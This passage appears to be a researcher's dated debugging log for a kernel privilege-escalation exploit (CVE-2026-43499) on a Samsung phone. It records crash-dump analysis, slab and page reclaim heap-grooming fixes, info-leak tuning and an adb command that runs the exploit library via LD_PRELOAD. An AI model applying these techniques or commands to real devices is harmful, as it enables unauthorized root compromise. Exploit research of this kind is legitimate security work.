   `parent->rb_right = target` with parent = struct page of a live page.
4. All synchronous in-walk panics (trylock(0), mid-walk derefs) were
   dead-frame shots, eliminated by fix #17.

So: gate hits=0 has three independent causes — residue absent (~90%),
reclaim miss (page_base not ours), or write landing on an idle page
(silent). The pipe gate cannot tell them apart; distinguishing residue
vs reclaim is the next diagnostic step.

### Volume run + current status (2026-07-31, end of session)

- 30-attempt volume run (burst=1, ENTER_DELAY=60ms, 100 ms window, armed
  gate): **attempt 1 fired** (`pselect ret=2 elapsed=100166`, copyback
  `in word=3=0x1` / `ex word=1=0x100000000` — the classic fire signature)
  and the device panicked immediately after. Notably this shot returned
  `sched_ok=0 last_sched_ret=-1` (sched_setattr itself failed — first
  observed; previous clean fires had sched_ok>0). Fires remain
  intermittent (~1/10 attempts across today's samples) and a fire still
  kills the device, because the write lands wherever `page_base`'s page
  happens to be (reclaim unverified) — the armed gate only eliminated the
  dead-frame crash class, not the bystander class.
- Net blocker ranking: (1) reclaim/placement verification — a completed
  erase has never landed on the oracle pipe; (2) residue rate ~1/10.
  Both must be solved for a clean root run.
- Open anomaly: `sched_setattr` duration of 39-340 ms inside the kernel
  on firing shots (retry loop vs migration noise — unresolved).
- Next steps on resume: (a) make the residue/reclaim distinction
  measurable (e.g. point `slide_oracle_parent` at the pipebuf page itself
  so any completed erase flips gate `changed` without needing the payload
  reclaim); (b) if reclaim is the miss, rework the cross-cache placement
  (order-3 frag vs freed pipe page); (c) only then run the real root
  chain without `P0_ORACLE_GATE_DIAG`.
- Note: after the volume-run panic the device stopped enumerating on adb
  (still absent after `adb kill-server`; check the phone physically —
  it may be in a boot loop or powered off).

### PARENT_PIPEBUF diagnostic (2026-08-01) — blocker resolved: it is reclaim, not the walk

Experiment planned under "Next steps (a)" above, now implemented and run:

- New env knob `P0_ORACLE_PARENT_PIPEBUF` (`src/util.c`,
  `prepare_skb_payload()`): for the gate slot, `parent` is set to
  `direct_to_page(pipebuf_page_base)` instead of `direct_to_page(base)`.
  A completed erase then flips the gate pipe's read-back **no matter where
  the payload reclaim landed**, separating "erase never completed"
  (residue missing / walk stalled) from "erase completed but the marker
  page is wrong" (reclaim miss).
- Command (background, log to file):
  `adb shell "P0_ORACLE_PARENT_PIPEBUF=1 P0_ORACLE_GATE_DIAG=1 \
  SKB_SNDBUF=4194304 SKB_RECLAIM_SENDS=128 SLIDE_ENTER_DELAY_USEC=60000 \
  SLIDE_CONSUMER_BURST=1 EXPLOIT_ATTEMPTS=10 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id"`
  (full log: `/tmp/parent-pipebuf-run.log`; ~10 min for 10 attempts, do
  not poll — read the file after completion).
- Result: 21 pselect windows across 10 attempts (some slots re-arm), 20 ×
  `ret=0`, **1 × `ret=2`** (attempt 10, slot=0). The fire completed the
  erase: `p0 physical write status=0 ok=1` and
  `p0 pipe gate hits=0 changed=1`, with the changed pipe (pipe=21) reading
  back `q0=fffffffe2170abc0 q1=0x1000 q3=0x10` — i.e. the gate pipe's
  `pipe_buffer` no longer points at the marker page. The erase works
  end-to-end when it fires. **Conclusion: the walk/erase mechanism and the
  arming geometry are sound; the sole remaining blocker is the payload
  reclaim (cross-cache placement of the marker page onto the freed pipe
  page), plus the low fire rate (~1/20 windows).**
- Detail worth noting: `q0=fffffffe2170abc0` does not equal the printed
  `parent=fffffffe23990a00`, so the observed read-back is not simply
  `parent|color` — the exact write-to-readback mapping should be
  re-derived when the reclaim work starts (it matters for picking the
  final `parent` in the real run).
- Device survived the whole run (no panic; the watchdog entry RWC:44 in
  `power_off_reset_reason.txt` predates it). Two USB adb drops observed
  with uptime intact — adb "device lost" on this setup is usually the
  cable/hub, not a crash; verify with `adb shell uptime` before assuming a
  reboot.

### Fix #18: free target-slab neighbours last, immediately before reclaim sends (2026-08-01)

Root cause analysis of the reclaim miss (`src/util.c`,
`prepare_kernel_page()`):

- The "mm objects" are `open("/proc/<pid>/mem")` fds pinning each cloned
  child's `mm_struct`; `close()` is what frees the `mm_struct` into the
  slab. Children are pinned to `exploit_core()` (`clone_child()`), and all
  closes run in our pinned process, so the freed slab page returns to the
  same CPU's pcp/buddy — locality is fine.
- The leak (`ks->mm_struct`) is the mm pinned by `memfd_leak`; its slab
  page also holds neighbouring objects belonging to `pre_ctx`/`post_ctx`
  fds. The target page therefore cannot return to the buddy allocator
  before the LAST of those fds closes.
- The old order closed `pre_ctx`/`post_ctx`/`memfd_leak` EARLY, then ran
  the slow bulk cleanup (`kill_child`+`waitpid` for drain triggers and all
  of `prepare_ctx`, each child exit doing kernel allocations), and only
  then sent the skb reclaim frags. If the target page's last object was in
  that early batch, the freed order-3 page sat exposed for the whole
  cleanup — long enough for unrelated allocations to steal it (the KP #37
  outcome: anon memory split the block).
- Fix #18 moves ALL `pre_ctx`/`post_ctx`/`memfd_leak` closes to after the
  `prepare_ctx` cleanup, immediately before the reclaim `sendmsg()` loop.
  The window between "target page becomes free" and "first skb frag
  allocation" is now just a few dozen `close()` syscalls (<1 ms).
- Validation run (same command as the PARENT_PIPEBUF diagnostic but
  WITHOUT that knob, so a completed erase writes
  `parent = direct_to_page(base)`): a fire then produces `gate hits>=1`
  iff the reclaim landed on our marker page, `changed>=1` iff the erase
  completed but the page is not ours. Log: `/tmp/fix18-reclaim-run.log`.
- Operational lesson (2026-08-01): after a DIAG fire, the restore path
  leaves a `p0 reference keeper` process behind (visible as a reparented
  `id` process, e.g. pid 23736) holding all 240 oracle pipes. The
  accumulated pipe pages push uid 2000 over the per-user pipe-page limit,
  and every subsequent attempt then dies at
  `fcntl(F_SETPIPE_SZ): Operation not permitted` → "pipe page child did
  not report base". Always `adb shell kill -9 <keeper-pid>` (check
  `ps -A | grep ' id$'`) before a new run. The first fix #18 validation
  run was lost to this; rerun as `/tmp/fix18-reclaim-run2.log`.
- Operational lesson 2 (2026-08-01): a completed DIAG fire corrupts kernel
  memory by design (the erase's second write `[parent+8]=target` hits a
  live `struct page` in vmemmap). The device can crash MINUTES LATER in
  unrelated code. Evidence — KP #45 (RWC:45, dump `prev_dump_rwc45.log`):
  `___slab_alloc+0x770` from `clone → copy_files → dup_fd → alloc_fdtable
  → __kmalloc_node`, fault addr `0x58c` (garbage freelist pointer), with
  `x23=ffffffe23990a00` / `x4=...+0x20` — exactly the DIAG run's
  `parent=direct_to_page(pipebuf_page_base)` value, i.e. the corrupted
  page struct. The crashing task was run2's attempt-1 child during its
  clone spray — an innocent kmalloc tripping the freelist planted by the
  earlier fire. So run2 told us nothing about fix #18; treat any post-fire
  boot as compromised and evaluate results only from a clean boot.
- fix #18 validation run3 (`/tmp/fix18-reclaim-run3.log`) runs on the
  fresh boot that followed KP #45.

### KP #46: the walk reaches the wake step — and proves the reclaim miss (2026-08-01)

Run3 attempt 2 fired and panicked mid-window (dump `prev_dump_rwc46.log`,
RWC:46):

- Signature: `BRK handler PC:queued_spin_lock_slowpath+0x310` (BRK
  #0x5512) in our exploit process (`Comm: id`).
- Call trace: `sched_setattr → __sched_setscheduler → rt_mutex_adjust_pi →
  rt_mutex_adjust_prio_chain+0x848 → wake_up_state → try_to_wake_up+0x60 →
  _raw_spin_lock_irqsave → queued_spin_lock_slowpath`. The chain walk went
  PAST the erase (+0x220) and the sanity check (+0x858 region) all the way
  to the final wake of the chain's top task — the furthest the trigger has
  ever been observed to go. The erase itself executed (no +0x220 crash).
- Registers: `x0/x8/x21 = ffffff8870bc0924 = page_base+0x924` (the fake
  task's `pi_lock`, offset +0x924 as established), `x3 =
  ffffff8870bc4200` (the printed fake_lock), `x20 = page_base`. The walk
  consumed the attempt-2 page as designed — but `pi_lock` was garbage
  (nonzero → slowpath → sanity BRK), while the payload memset it to 0 and
  the erase's writes never touch `page_base+0x924`. Conclusion: **the page
  content was NOT our payload — the reclaim missed again**, and the walk
  ran on garbage. KP #46 is therefore the clean "reclaim miss" signature:
  crash in the wake step taking a garbage `pi_lock`, not in the erase.
- Why fix #18 made reclaim impossible: an empty slub slab sits on the
  per-node partial list and only returns to the buddy allocator (where the
  skb order-3 frags can claim it) when partial-list pressure discards it.
  Fix #18 freed the target-slab neighbours AFTER the drain/cleanup
  pressure, so the target page never reached the buddy allocator before
  the sends. Fix #19 reverts the ordering (neighbours → drains → prepare
  cleanup → sends) and the validation run adds pressure/volume knobs:
  `MM_DRAIN_TRIGGERS=8 SKB_SNDBUF=8388608 SKB_RECLAIM_SENDS=256`
  (`/tmp/fix19-reclaim-run.log`).

### KP #47 + fix #20: shrink the buddy-exposure window to the drain kills (2026-08-01)

- fix #19 run (`/tmp/fix19-reclaim-run.log`): 5 attempts reached the
  window, 8 × `ret=0`, then attempt 5 fired and panicked (RWC:47, dump
  `prev_dump_rwc47.log`): `_raw_spin_trylock+0x1c` /
  `rt_mutex_adjust_prio_chain+0x130`, fault addr 0 (the historical
  `waiter->lock=0` signature), `x27=x3=ffffff88d7f04200` = attempt 5's
  fake_lock. The walk again consumed non-payload content — reclaim miss.
  Two fires, two misses (#18→KP#46, #19→KP#47); the knob increases alone
  do not beat the theft race.
- Failure model refinement: with #19 the target page reaches the buddy
  allocator during the drain triggers, but the ~100+ remaining
  `prepare_ctx` child kills between the drains and the sends are all
  exit-path allocations on our core — a long theft window (KP #37 showed
  anon memory wins that race).
- Fix #20 (`src/util.c`): the reclaim `sendmsg()` loop now runs
  IMMEDIATELY after the drain triggers; the remaining prepare_ctx cleanup
  is deferred until after the sends. Window between "target page in buddy"
  and "first frag allocation" shrinks from ~100+ child exits to the 8
  drain kills. Attempts whose target slab still holds a prepare_ctx
  object (rare — the leaked object and its neighbours live in
  pre/post/leak) simply miss, same expected value as before.
- Panic-signature cheat sheet for future fires: `+0x130 trylock /
  waiter->lock=0` or wake-step garbage `pi_lock` (BRK in qspinlock) =
  reclaim miss; `+0x220 rb_erase` crash = erase write hit a bad target;
  clean `gate hits=1 changed=0` = reclaim hit, proceed without DIAG.

### Three fires, three misses — order-0 anon-grab hypothesis (2026-08-01)

- fix #20 run (`/tmp/fix20-reclaim-run.log`): attempt fired → KP #48
  (RWC:48, `prev_dump_rwc48.log`), byte-identical signature to KP #47
  (`+0x130 trylock`, fault addr 0, `x27=x3=<fake_lock>`). Count so far:
  KP #46 (fix #18), KP #47 (fix #19), KP #48 (fix #20) — every fire walks
  non-payload content. Tightening the free→send window does not win the
  race, which suggests the skb order-3 channel itself is the problem,
  not the timing.
- New hypothesis (from KP #37's anon-theft evidence): the freed order-3
  block reliably reaches the buddy allocator but gets split and consumed
  by order-0 allocations before our frags queue. Weaponise it: reclaim
  with OUR OWN anon faults. Buddy splitting hands out the block's FIRST
  4 KB page first, so a compact payload living entirely in
  `page_base+0x000-0xFFF` (task 0x000-0x960 fits; lock/waiters/marker
  move up from 0x4200/0x5200 into 0x980-0xFFF) would be reclaimable via
  a handful of mmap faults — with fully controlled content.
- Current layout for reference (`targets/e3q-S9280ZCS6DZF2/target.h`):
  `SKB_DATA_DELTA=-0x1000` so payload index I ↔ base+I-0x1000;
  `SLIDE_BANK_TASK_OFF 0x1000` (task ↔ base+0x000, pi fields to +0x958),
  `SLIDE_BANK_LOCK_OFF 0x5200` (lock ↔ base+0x4200), slots stride 0x100,
  gate marker at payload 0x1e80 (↔ base+0xe80).
- Cheap decisive test first (`ANON_GRAB_TEST=1`, `/tmp/anon-grab-run.log`):
  after the drains, fault 256 anon pages filled with 0x41, then send the
  skb frags as usual. If a fire's crash dump shows 0x4141414141414141 in
  the walk registers (or fault addr like 0x41414141414141xx), anon faults
  DO win the freed page → build the compact 4 KB payload. If it shows
  random garbage again, the page is going somewhere else entirely
  (re-examine whether it reaches the buddy allocator at all).

### KP #49 — ANON_GRAB_TEST verdict: the page never leaves the mm_struct cache (2026-08-01)

- Run (`/tmp/anon-grab-run.log`, dump `s9280-port/lastkmsg_49.txt`): a fire
  happened after the 256-page 0x41 anon grab. Crash dump: fault addr still
  0, no `0x4141414141414141` anywhere in the walk registers. Neither our
  order-0 anon faults NOR the order-3 skb frags got the page.
- The waiter pointers the walk consumed were "plausible" kernel pointers
  (`x19`/`x9` in the same 32 KB region, ~0x4b00 apart — looks like a real
  mm_struct's VMA rb pointers): the leaked slot was reallocated as
  ANOTHER mm_struct. The freed page never left the mm_struct cache; the
  emptied slab stayed on the SLUB partial list and concurrent system
  forks refilled it before any of our reclaim channels ran.
- This invalidates the page-level cross-cache premise on this device
  (fixes #18/#19/#20 were all timing variants of the same losing race)
  and kills the "compact 4 KB payload + anon reclaim" plan above: the
  block never reaches the buddy allocator, so no buddy-based channel
  (skb frags, anon faults) can ever claim it.

### Fix #21 — LATE_NEIGHBOUR_FREE: force the empty slab to the buddy allocator (2026-08-01)

- Discarded alternative (object-level msg_msg cross-cache): the handoff
  plan was to spray 0x3d0-byte msgsnd messages (0x30 header + 0x3d0 =
  0x400) to reuse the freed mm_struct SLOTS directly. Dropped: device
  slabinfo shows `mm_struct` is a DEDICATED cache
  (`mm_struct  1000  1160  1024  32  8`), not kmalloc-1k, and msg_msg is
  allocated with GFP_KERNEL_ACCOUNT (kmalloc-cg-1k). Wrong cache — object
  reuse across caches is impossible. Only mm_struct allocations (fork)
  ever occupy those slots, and we do not control fork's content.
- Root cause re-read: an empty slab is discarded to the buddy allocator
  ONLY when `__slab_free` runs with `nr_partial >= min_partial` (default
  5). Fixes #19/#20 freed the target-slab neighbours FIRST — the slab
  emptied while the partial count was still ~0, so it went onto the
  partial list instead of the buddy allocator, and forks refilled it.
  The drains that WOULD have raised the pressure ran afterwards. The
  ordering was exactly backwards.
- Fix #21 (`src/util.c`, env `LATE_NEIGHBOUR_FREE=1`): swap the two
  phases. (1) Run the prepare-spray drains FIRST — each killed prepare
  child frees one mm from a distinct full slab, turning it partial;
  with `MM_DRAIN_TRIGGERS=8`, `nr_partial` reaches ~8 > min_partial.
  (2) Then free the neighbours (spray/pre/post closes as before) and
  FINALLY `close(memfd_leak)` — the last object of the target slab.
  That final `__slab_free` now sees `nr_partial >= min_partial` and
  discards the empty order-3 slab to the buddy allocator.
  (3) The skb reclaim sends run immediately after (fix #20 ordering
  kept), so the buddy window is microseconds. `kill_child` is
  synchronous (`waitpid` after SIGKILL), so each drain's mm free has
  fully landed before the neighbour closes begin.
- Expected read-out, same cheat sheet: `+0x130 trylock / waiter->lock=0`
  or 0x41-free garbage = reclaim still missing (then dump
  `/proc/slabinfo` partial counts via a root-side channel is moot — next
  step would be raising `MM_DRAIN_TRIGGERS`); clean `gate hits=1
  changed=0` = reclaim hit, proceed without DIAG.

### KP #50 (DP) — fix #21 run 1: watchdog hang instead of instant panic (2026-08-01)

- Run (`/tmp/late_free_run1.log`, `LATE_NEIGHBOUR_FREE=1`,
  `MM_DRAIN_TRIGGERS=8`, no PARENT_PIPEBUF): fired on ATTEMPT 1
  (`mm leaked=ffffff8a53740c00`, base `...740000`). Userspace log stops
  right after `slide consumer sched idx=0` — the trigger entered the
  kernel and never came back.
- Dump `dumpstate_lastkmsg_50_..._DP.log.gz` (`s9280-port/lastkmsg_50.txt`):
  NOT a walk panic. Kernel logs go silent for ~4 s (1240.8 -> 1244.7),
  then `sched: RT throttling activated`, then the gh-watchdog bark/bite
  (last pet 1234.4, cpu alive mask 01) — a system-wide stall, signature
  "DP" (dog panic), not "KP". The three `binder:1681_3` Call traces
  (581 s/1119 s/1133 s) are benign wifi rtnl-lock noise.
- Read: the failure MODE changed from the KP #46-#49 instant
  `+0x130 trylock` crash to a multi-second all-core stall, i.e. the walk
  this time got PAST the trylock on waiter->lock. Most likely it walked
  third-party content (reclaim still missing) far enough to corrupt a
  hot lock in the erase/wake steps (the erase's second write hits
  `page_struct(base)+8` when PARENT_PIPEBUF is unset, and ttwu on a
  garbage task can spin on a real rq lock) -> scheduler deadlock ->
  RT throttle -> watchdog. The changed signature is consistent with
  fix #21 altering what occupies the target slab at trigger time, but
  this dump alone cannot prove a reclaim hit/miss.
- Ladder for the next runs: run 2 = fix #21 + `P0_ORACLE_PARENT_PIPEBUF=1`
  (both erase writes land inside the oracle pipebuf page, so a completed
  erase survives to userspace and flips the gate pipe: `changed=1` even
  on a reclaim miss of the marker page). If run 2 returns `changed=1`,
  the walk completed end-to-end under fix #21; then run 3 drops
  PARENT_PIPEBUF to test the real gate (`hits=1`) before dropping DIAG.
- Run 2 outcome (`/tmp/late_free_run2.log`, drains=16, 10 attempts):
  ZERO fires — every attempt `gate hits=0 changed=0 result=0`
  (not-triggered), no panic, no hang. Inconclusive for reclaim; the
  ~1/10 fire rate just whiffed twice in a row (run 1's single fire hung,
  run 2 had none). Run 3 repeats the same PARENT_PIPEBUF config with
  `EXPLOIT_ATTEMPTS=20` to collect more fire samples; a fire that
  returns `changed=1` proves the walk completed under fix #21, a fire
  that hangs/panics again means the walked content is still not ours.

### KP #51 — fix #21 run 3: silent fire, erase scribbles into a page's lru (2026-08-01)

- Run 3 (`/tmp/late_free_run3.log`, PARENT_PIPEBUF=1, drains=16,
  20 attempts): attempts 1-6 all `pselect ret=0`, `gate 0/0` (no
  early-wake window). Attempt 7 stopped mid-prepare (right after the
  `p0 profile` line) — device panicked at uptime 500 s.
- Dump `dumpstate_lastkmsg_51_..._KP.log.gz` (`s9280-port/lastkmsg_51.txt`):
  panic is in **kswapd0** (CPU 6), NOT in the walk:
  `__list_del_entry_valid+0xbc` <- `free_pcppages_bulk` <-
  `free_unref_page_commit` <- `free_unref_page_list` <-
  `shrink_folio_list` <- `evict_folios` <- `shrink_node` <- `kswapd`.
  A page's lru linkage was corrupted earlier; kswapd tripped over it
  when attempt 7's pipe-oracle prep created memory pressure.
- Read: one of attempts 1-6 fired SILENTLY (`ret=0` fires without the
  early-wake window are exactly why the post-failure gate check exists),
  the reclaim missed, and the walk this time SURVIVED past `+0x130
  trylock` all the way to `+0x220 rb_erase` — whose two-pointer write
  (`[target]=parent|color`, `[parent+8/0x10]=target`) took garbage
  parent/target from the wrong page and scribbled kernel pointers into
  live memory, one landing in some page's `lru` linkage. The gate pipe
  read `changed=0` because a miss's erase uses the garbage waiter's
  parent/target, not ours, so the pipebuf page is untouched.
- Consolidated signal across fix #21 runs 1+3: pre-fix#21 fires died
  INSTANTLY at `+0x130 trylock` (waiter->lock=0); fix #21 fires get
  PAST it (DP hang / erase scribble). The target slab's content at
  trigger time has changed — consistent with the empty slab now
  reaching the buddy allocator (fix #21 working) and being claimed by
  someone other than our skb frags (third-party content in the page).
- Run 4 = fix #21 + `ANON_GRAB_TEST=1` (no PARENT_PIPEBUF): if order-0
  anon faults can now win the buddy-released block, the walk consumes
  `0x41` bytes and dies instantly at trylock with the unmistakable
  `0x4141414141414141` signature (contained crash, no scribble). If so,
  resurrect the shelved compact-4 KB-payload plan (task at base+0x000
  already fits; move lock/waiter/marker from 0x4200/0x5200 into
  0x980-0xFFF) and reclaim via mmap faults instead of skb frags.

### Fix #22 — COMPACT_PAYLOAD: 4 KB walk image + anon-fault reclaim (2026-08-01)

- Implemented env-gated (`COMPACT_PAYLOAD=1`) in `src/util.c` while run 4
  collects its verdict, so a positive 0x41 signature can be acted on
  immediately:
  - `prepare_skb_payload` SLIDE branch: writes a compact 4 KB image —
    fake_task at block+0x000 (pi fields reach +0x958), fake_lock at
    +0x980 (wait_list +0x988/+0x990, owner +0x998), fake waiter at
    +0x9C0-0xA18, gate marker at +0xA20 — replicated at every 0x1000
    payload index >= 0x1000 (self-referential pointers per page), with
    slot-0 parent/target identical to the legacy gate slot.
  - `select_slide_payload_index`: compact mapping
    (task=payload+0x1000, lock=+0x1980, w0=+0x19C0), slot 0 only.
  - `prepare_kernel_page`: the ANON_GRAB_TEST mmap/fault block is shared;
    with COMPACT_PAYLOAD each of the 256 grab pages is filled with the
    4 KB image (memcpy from skb_buf idx 0x1000, pointers anchored at
    base+0x000) instead of 0x41. Whichever anon fault splits the
    buddy-released block installs the full walk image at base+0x000;
    the skb frag sends stay as a same-layout fallback channel.
- Verification plan: run 5 = `LATE_NEIGHBOUR_FREE=1 COMPACT_PAYLOAD=1
  P0_ORACLE_GATE_DIAG=1` — a fire that reaches userspace with
  `gate hits=1 changed=0` is the reclaim-hit milestone; then drop DIAG.

### KP #52 — run 4 verdict: anon grab lost again; same +0x130 instant crash (2026-08-01)

- Run 4 (`/tmp/late_free_run4.log`, fix #21 + `ANON_GRAB_TEST=1`, 7
  attempts logged): attempts 1-6 no fire; attempt 7 fired and died
  instantly. Dump `dumpstate_lastkmsg_52_..._KP.log.gz`
  (`s9280-port/lastkmsg_52.txt`): pc `_raw_spin_trylock+0x1c`, lr
  `rt_mutex_adjust_prio_chain+0x130`, fault addr 0, in our `id` child —
  the byte-identical pre-fix#21 signature. `x27=x3=ffffff8a4631c200`
  = attempt 7's fake_lock (legacy layout base+0x4200). Walked content:
  `waiter->task=x19=ffffff88e0498000` (plausible task pointer,
  `x26=x19+0x924` = its pi_lock), `waiter->lock=0`.
- ZERO occurrences of `0x4141414141414141` in the dump: the 256-page
  0x41 anon grab did NOT win the block even under fix #21 — neither did
  the skb frags (no gate hit). Third-party content again.
- Consolidated fix #21 fire samples (3 fires, 3 different signatures):
  KP #50 (DP watchdog hang, walk got far), KP #51 (silent fire, erase
  scribbled a page lru, kswapd died later), KP #52 (instant +0x130
  crash, old signature). The buddy-race loser set is diverse — exactly
  what "the block now leaves the mm_struct cache but lands somewhere
  random" looks like. The remaining problem is no longer getting the
  page OUT of the cache; it is winning it BACK deterministically.

### Fix #23 — SKB_RECLAIM_SOCKS: multi-socket frag volume (2026-08-01)

- Root cause of the losing race, quantified: one stream socket with
  `SKB_SNDBUF=8 MB` accepts only ~250 64 KB sends before ENOBUFS
  (log: `sends=251/256`) ≈ 500 order-3 frags. If the zone's order-3
  free lists (plus coalesced higher-order blocks) are deeper than that
  at trigger time, our spray never reaches the target block.
- Fix (`src/util.c`, env `SKB_RECLAIM_SOCKS=N`, 1-8): create N-1 extra
  socketpairs (each with its own SNDBUF, O_NONBLOCK) in
  `prepare_kernel_page`; the reclaim send loop sprays
  `SKB_RECLAIM_SENDS` messages on EVERY socket. With N=8: ~2000 sends ≈
  ~4000 order-3 frags ≈ 128 MB queued — deep enough to exhaust the
  order-3 free lists (and split down higher orders), so the target
  block is consumed by OUR frags with high probability.
  `close_reclaim_sockets()` cleans up the extra pairs.
- Run 5 = `LATE_NEIGHBOUR_FREE=1 SKB_RECLAIM_SOCKS=8
  P0_ORACLE_GATE_DIAG=1` (drains=16, 20 attempts): watch for the first
  fire that reaches userspace with `gate hits=1 changed=0`; then drop
  DIAG and run the real root chain. COMPACT_PAYLOAD stays on the shelf
  unless run 5 shows the skb channel structurally cannot win.

### KP #53 — run 5 verdict: deep spray still loses; the slab-growth-thief theory (2026-08-01)

- Run 5 (`/tmp/fix23_run5.log`, fix #21+#23, 2008/2048 sends ≈ 4000
  order-3 frags): 19 visible attempts, ZERO fires, then attempt 20 died
  mid-prepare. Dump `dumpstate_lastkmsg_53_..._KP.log.gz`
  (`s9280-port/lastkmsg_53.txt`): `__list_del_entry_valid+0xcc` <-
  `move_freepages_block` <- `get_populated_pcp_list` <-
  `get_page_from_freelist` <- `__alloc_pages` <- `alloc_fdtable` <-
  `dup_fd` <- `copy_process` — in OUR `id` process during a fork, uptime
  699 s. Same class as KP #51 (kswapd): a free-list linkage corrupted
  by an earlier SILENT fire's erase (garbage parent/target two-pointer
  write). Second consecutive run killed this way.
- Tally under fix #21: 4 fires (KP #50 hang, #51 scribble, #52 instant
  crash, #53 scribble), ALL reclaim misses — even with ~4000 frags
  queued. Statistical volume cannot explain 4/4 losses IF the block
  sat at the buddy head when our frags allocated.
- New theory (slab-growth thief): the FIRST order-3 allocation after
  `close(memfd_leak)` takes the block. Our own stream spray's per-send
  skb struct allocations (kmalloc-2k, order-3 slabs) force slab growth
  that claims the block into a KERNEL-content slab page before/at frag
  allocation time; once a slab page, it never returns to buddy, so all
  4000 frags miss. KP #52's walked content (plausible task pointer,
  zero lock) fits a kernel-object slab page.
- Corollary: whoever owns the first post-free order-3 allocation owns
  the block; make that allocation a CONTROLLED-CONTENT slab growth.
  msg_msg is unavailable (`# CONFIG_SYSVIPC is not set` on this kernel),
  but unix DGRAM works: a ~4 KB datagram's data buffer is kmalloc'd
  inline (kmalloc-8k, order-3) with content controlled from +0x22
  (NET_SKB_PAD+NET_IP_ALIGN reserve). Every slab page our dgram spray
  grows becomes a page full of walk images — thief becomes carrier.

### Fix #26 — DGRAM_RECLAIM: controlled-content slab growth (2026-08-01)

- `src/util.c`, env `DGRAM_RECLAIM=1`:
  - The fix #22 compact 4 KB image builder now also runs for
    DGRAM_RECLAIM (nothing below +0x40 is referenced, so the +0x22
    dgram reserve is harmless); `select_slide_payload_index` maps slot 0
    to the compact addresses (task=base+0x000, lock=+0x980, w0=+0x9C0).
  - The fix #23 extra socketpairs become SOCK_DGRAM; the dgram payload
    is the image shifted by +0x22 (`skb_buf+0x1000+0x22`, len 0xFDE) so
    each kmalloc-8k object equals the image byte-for-byte.
  - The dgram spray runs BEFORE the stream frag spray (first post-free
    allocation must be ours), ~2000 dgrams/socket until ENOBUFS.
- Run 6 = `LATE_NEIGHBOUR_FREE=1 DGRAM_RECLAIM=1 SKB_RECLAIM_SOCKS=8
  P0_ORACLE_GATE_DIAG=1` (drains=16, 20 attempts): attempt 1 queued
  **13902 dgrams** (~65 MB controlled objects ≈ 1700 order-3 slab
  pages). A fire that returns `gate hits=1 changed=0` = reclaim hit;
  then drop DIAG. If a fire crashes, check the dump for a +0x22 offset
  error (x27 vs expected fake_lock) — Samsung/QCOM could reserve more
  than 34 B in the skb head.

### KP #54 — run 6 verdict: bogus KernelSnitch leak, pgd=0 (2026-08-01)

Run 6 crashed on attempt 6 (`s9280-port/lastkmsg_54.txt`):

- `Unable to handle kernel paging request at ffffff8ba9bd0980`,
  pc `_raw_spin_trylock+0x1c`, FSC = level-1 translation fault,
  **pgd=0** for the faulting address.
- That attempt logged `mm leaked=ffffff8ba9bd2000
  base=ffffff8ba9bd0000 object_index=8`, so the fault address is
  exactly this attempt's fake_lock (base+0x980): x0=x3=x24=x27.
- The walk was real: x19=x5=ffffff895b23ddc0 (walked task, NOT our
  fake_task), x26=x19+0x924 (its pi_lock), x25=ffffffc0484e3c38 (a
  genuine on-stack rt_mutex_waiter whose ->lock field the slide had
  rewritten to base+0x980). So the slide + consumer walk chain fired
  perfectly; only the leaked `base` was invalid.
- Verdict: **KernelSnitch false-positive leak**, not a reclaim or
  content problem. A freed linear-map page stays mapped (the physmap is
  static), so pgd=0 proves the address was NEVER mapped — the leaked
  value is a hash coincidence, not a real mm. Previous leaks all
  clustered in ffffff8873..ffffff8a64; this one is >1 GB above every
  address ever observed.
- Mechanism (`src/kernelsnitch/kernelsnitch.h::__mm_leak`): the
  bruteforce accepts the FIRST candidate in the 64 GB identity range
  whose futex_hash matches all collisions, racing 8 threads. With
  KSNITCH_COLLISIONS=4 (3 pair tests, 4096 buckets) the expected
  false-candidate count across ~67M candidates is ~1e-3 — and a false
  candidate lands uniformly anywhere in the 64 GB range, mostly in
  unmapped gaps, hence pgd=0.

### Fix #27 — KSNITCH_COLLISIONS 4 -> 6 (2026-08-01)

- `src/common.h`: `KSNITCH_COLLISIONS` is now `#ifndef`-guarded;
  `src/targets/e3q-S9280ZCS6DZF2/target.h` defines it to 6.
- With 6 collisions (5 pair tests) the expected false-candidate count
  drops to ~1e-10 — false leaks effectively impossible. Collision
  finding needs 5 piled-up user futex addresses instead of 3
  (expected ~24 candidates over the scan, so setup stays reliable).
- Run 7 = same knobs as run 6, 20 attempts. Watch for: (a) zero
  pgd=0-style bogus-base panics, (b) a fire with `gate hits=1
  changed=0` = dgram reclaim hit -> drop DIAG and run the full chain.

### KP #55 — run 7 verdict: leak genuine, walk passes trylock, content is the thief's (2026-08-01)

Run 7 attempt 1 crashed (`s9280-port/lastkmsg_55.txt`) with a brand-new
signature:

- pc `rt_mutex_adjust_prio_chain+0x4a4` (FAR past the +0x130 trylock),
  fault address `0001000000000040`, FSC level-0.
- x24=x3=ffffff804af60980 = this attempt's fake_lock (base+0x980), and
  the trylock on it SUCCEEDED — so the leaked page at
  base=ffffff804af60000 is mapped and the leak was genuine.
  **Fix #27 works.** (The low 1.2 GB-offset base vs the run-6 8-10 GB
  cluster is just a fresh-boot RAM layout, not a leak regression.)
- But x19 = 0x0001000000000000 (derefed at +0x40) and
  x9 = 0x0000000100000002: small packed-int kernel-object content, NOT
  our compact image. If our dgram image were at page+0x980 the rb
  leftmost/owner chain would read base+0x9C0 or zeros, never these
  values. The page was reclaimed by somebody else (fresh mm_struct /
  similar small-int object).
- Interpretation: the free-to-buddy -> first-allocator race is still
  lost EVERY time, so the thief is systematic, not a random system
  fork. Open hypotheses: (a) the target slab never leaves the
  mm_struct cache on some attempts (fix #21 discard conditional on
  nr_partial timing), (b) mm_struct cache growth steals the block,
  (c) buddy merge buries our block inside a larger free block and
  splits hand out other pieces first.

### Fix #28 — SLABINFO_DIAG: three-point slab census (2026-08-01)

- `src/util.c`, env `SLABINFO_DIAG=1`: parse /proc/slabinfo and log
  `mm_struct` + `kmalloc-8k` active/total objects and slabs at three
  points: `leak` (baseline), `post-free` (right after
  close(memfd_leak)), `post-spray`.
- Verdict key: `mm slabs` must DROP by 1 at post-free (discard
  happened). If it doesn't -> fix #21's discard is unreliable and that
  is the whole reclaim story. If it drops but `mm slabs` RISES at
  post-spray -> the mm cache is the thief (fix: top the cache up with
  held mm allocs before the free). If neither -> the thief is outside
  these two caches (buddy-merge / other cache) and we re-theorize.

### Walk disasm addendum: the +0x4a4 crash step (2026-08-01)

From vmlinux.elf (`rt_mutex_adjust_prio_chain` base 0xffffffc00912271c):

